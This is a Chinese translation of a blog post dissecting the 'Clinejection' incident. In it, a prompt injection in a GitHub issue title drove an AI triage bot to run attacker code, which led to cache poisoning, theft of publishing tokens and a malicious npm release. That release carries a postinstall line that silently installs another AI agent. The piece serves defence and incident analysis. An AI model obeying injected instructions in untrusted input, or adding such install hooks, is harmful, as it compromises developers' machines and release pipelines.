---
layout: post
title: "Clinejection：当你的 AI 工具静默安装另一个 AI 代理"
date: 2026-03-06 16:20:07 +0800
categories: tech-translation
description: "一次从 GitHub issue 标题开始的供应链攻击，导致 4000 台开发者机器被静默安装了恶意 AI 代理。本文深入分析 Clinejection 攻击链及其对 AI 工具安全的影响。"
original_url: https://grith.ai/blog/clinejection-when-your-ai-tool-installs-another
source: Hacker News
---

本文翻译自 [Clinejection: When Your AI Tool Installs Another](https://grith.ai/blog/clinejection-when-your-ai-tool-installs-another)，原载于 Hacker News。

---

从 GitHub issue 标题到 4000 台被入侵的开发者机器，只需要五步。而这一切的入口点，就是自然语言。

2026 年 2 月 17 日，有人向 npm 发布了 `cline@2.3.0`。CLI 二进制文件与上一版本字节完全相同。唯一的变化是 `package.json` 中的一行：

```json
"postinstall": "npm install -g openclaw@latest"
```

在接下来的八个小时里，每个安装或更新 Cline 的开发者都在未经同意的情况下，全局安装了 OpenClaw —— 一个拥有完整系统权限的独立 AI 代理。在该包被下架之前，大约发生了 4000 次下载。

有趣的部分不在于载荷（payload）本身，而在于攻击者是如何获取 npm token 的：通过在 GitHub issue 标题中注入提示词（prompt），被 AI 分类机器人读取、解释为指令并执行。

## 完整攻击链

这次被 Snyk 命名为 "Clinejection" 的攻击，将五个已知的漏洞组合成一个单一的漏洞利用，只需要打开一个 GitHub issue 就能触发。

### Step 1: 通过 issue 标题进行提示词注入

Cline 部署了一个使用 Anthropic `claude-code-action` 的 AI 驱动 issue 分类工作流。该工作流配置了 `allowed_non_write_users: "*"`，意味着任何 GitHub 用户都可以通过创建 issue 来触发它。Issue 标题通过 `${{ github.event.issue.title }}` 直接插值到 Claude 的提示词中，没有任何清理。

1 月 28 日，攻击者创建了 Issue #8904，标题被精心设计成看起来像性能报告，但包含嵌入式指令：从特定的 GitHub 仓库安装一个包。

### Step 2: AI 机器人执行任意代码

Claude 将注入的指令解释为合法指令，运行了指向攻击者 fork 的 `npm install` —— 一个 typosquat 仓库（`glthub-actions/cline`，注意 'github' 中少了 'i'）。该 fork 的 `package.json` 包含一个 preinstall 脚本，会获取并执行远程 shell 脚本。

### Step 3: 缓存投毒

Shell 脚本部署了 Cacheract，一个 GitHub Actions 缓存投毒工具。它向缓存中注入超过 10GB 的垃圾数据，触发 GitHub 的 LRU 驱逐策略，清除合法的缓存条目。投毒的条目被精心设计成匹配 Cline 夜间发布工作流使用的缓存键模式。

### Step 4: 凭证窃取

当夜间发布工作流运行并从缓存恢复 `node_modules` 时，它获得了被破坏的版本。发布工作流持有 `NPM_RELEASE_TOKEN`、`VSCE_PAT`（VS Code Marketplace）和 `OVSX_PAT`（OpenVSX）。所有三个凭证都被窃取。

### Step 5: 恶意发布

使用被盗的 npm token，攻击者发布了带有 OpenClaw postinstall 钩子的 `cline@2.3.0`。被破坏的版本在线八小时后，StepSecurity 的自动监控才标记它 —— 大约在发布后 14 分钟。

## 糟糕的凭证轮换让情况更糟

安全研究员 Adnan Khan 实际上在 2025 年 12 月底就发现了这个漏洞链，并在 2026 年 1 月 1 日通过 GitHub Security Advisory 报告了它。他在五周内发送了多次跟进。没有一个收到回复。

当 Khan 在 2 月 9 日公开披露时，Cline 在 30 分钟内通过移除 AI 分类工作流进行了修补。他们第二天开始凭证轮换。

但是轮换是不完整的。团队删除了错误的 token，让暴露的那个保持活跃。他们在 2 月 11 日发现错误并重新轮换。但攻击者已经窃取了凭证，npm token 保持有效的时间足够长，以至于六天后发布了被破坏的包。

Khan 不是攻击者。一个单独的、未知的行动者在他的测试仓库上发现了 Khan 的概念验证，并将其武器化直接攻击 Cline。

## 新模式：AI 安装 AI

这个特定的漏洞链很有趣但并非前所未有。提示词注入、缓存投毒和凭证窃取都是已记录的攻击类别。让 Clinejection 与众不同的是结果：一个 AI 工具静默地在开发者机器上引导安装第二个 AI 代理。

这在供应链中创建了一个递归问题。开发者信任工具 A（Cline）。工具 A 被破坏以安装工具 B（OpenClaw）。工具 B 有自己的能力 —— shell 执行、凭证访问、持久守护进程安装 —— 这些独立于工具 A，对开发者原始信任决策不可见。

安装的 OpenClaw 可以从 `~/.openclaw/` 读取凭证，通过其 Gateway API 执行 shell 命令，并将自己安装为重启后仍然存活的持久系统守护进程。严重性存在争议 —— Endor Labs 将载荷描述为更接近概念验证而非武器化攻击 —— 但机制才是关键。下一个载荷不会是概念验证。

这是供应链版的"困惑的代理人"（confused deputy）：开发者授权 Cline 代表他们行动，而 Cline（通过破坏）将该权限委托给一个完全独立的代理，开发者从未评估、从未配置、从未同意。

## 为什么现有的控制没有捕获它

- **npm audit**: postinstall 脚本安装一个合法的、非恶意的包（OpenClaw）。没有恶意软件可检测。
- **代码审查**: CLI 二进制文件与上一版本字节完全相同。只有 `package.json` 改变了，而且只改了一行。专注于二进制变更的自动 diff 检查会错过它。
- **来源证明（Provenance attestations）**: Cline 当时没有使用基于 OIDC 的 npm provenance。被破坏的 token 可以在没有 provenance 元数据的情况下发布，StepSecurity 将此标记为异常。
- **权限提示**: 安装发生在 `npm install` 期间的 postinstall 钩子中。没有 AI 编码工具在依赖项的生命周期脚本运行之前提示用户。操作是不可见的。

攻击利用了开发者认为他们正在安装的东西（Cline 的特定版本）与实际执行的东西（包中的任意生命周期脚本及其传递安装的所有内容）之间的差距。

## Cline 之后做了什么改变

Cline 的事后分析概述了几个补救步骤：

- 从处理凭证的工作流中消除了 GitHub Actions 缓存使用
- 为 npm 发布采用 OIDC provenance attestations，消除长期有效的 token
- 为凭证轮换添加验证要求
- 开始制定具有 SLA 的正式漏洞披露流程
- 委托第三方对 CI/CD 基础设施进行安全审计

这些是有意义的改进。仅 OIDC 迁移就能阻止攻击 —— 当 provenance 需要来自特定 GitHub Actions 工作流的加密证明时，被盗的 token 无法发布包。

## 架构问题

Clinejection 是一个供应链攻击，但它也是一个代理安全问题。入口点是 GitHub issue 标题中的自然语言。链中的第一个环节是一个 AI 机器人，它将不受信任的文本解释为指令，并以 CI 环境的权限执行它。

这是我们在 MCP 工具投毒和代理技能注册表背景下写过的相同结构模式 —— 不受信任的输入到达代理，代理对其采取行动，在执行之前没有任何东西评估结果操作。

这里的不同之处在于代理不是开发者的本地编码助手。它是一个在每个新 issue 上运行的自动化 CI 工作流，拥有 shell 访问权限和缓存凭证。影响半径不是一台开发者的机器 —— 它是整个项目的发布管道。

每个在 CI/CD 中部署 AI 代理的团队 —— 用于 issue 分类、代码审查、自动化测试或任何其他工作流 —— 都有相同的暴露。代理处理不受信任的输入（issues、PRs、评论）并有权访问机密（tokens、keys、credentials）。问题在于是否有任何东西评估代理如何使用该访问权限。

每个系统调用级别的拦截在操作层捕获这类攻击。当 AI 分类机器人尝试从意外的仓库运行 `npm install` 时，操作在执行前根据策略进行评估 —— 无论 issue 标题说了什么。当生命周期脚本尝试向外部主机窃取凭证时，出口被阻止。

入口点会变化。操作不会。grith 旨在准确捕获这类问题 —— 在系统调用层评估每个操作，无论哪个代理触发了它或为什么。

---

## 关键要点

1. **提示词注入是真实威胁**：AI 代理处理不受信任的输入时，必须像处理 SQL 注入一样小心对待提示词注入。
2. **CI/CD 中的 AI 代理风险更高**：当 AI 工具拥有发布凭证时，影响范围从单个开发者扩展到整个供应链。
3. **凭证轮换必须完整验证**：Cline 的教训是，错误的轮换比不轮换更危险，因为它会给人虚假的安全感。
4. **postinstall 脚本是不可见的攻击面**：`npm install` 期间的任意代码执行是成熟的攻击向量，但 AI 时代赋予了它新的意义。
5. **OIDC provenance 是关键防护**：将发布权限绑定到特定工作流可以显著降低 token 泄露的影响。

作为开发者，我们需要重新审视我们对 AI 工具的信任模型。当你安装一个 AI 编程助手时，你不仅在信任它本身，还在信任它的整个供应链 —— 包括可能被破坏的依赖项和 CI/CD 管道。
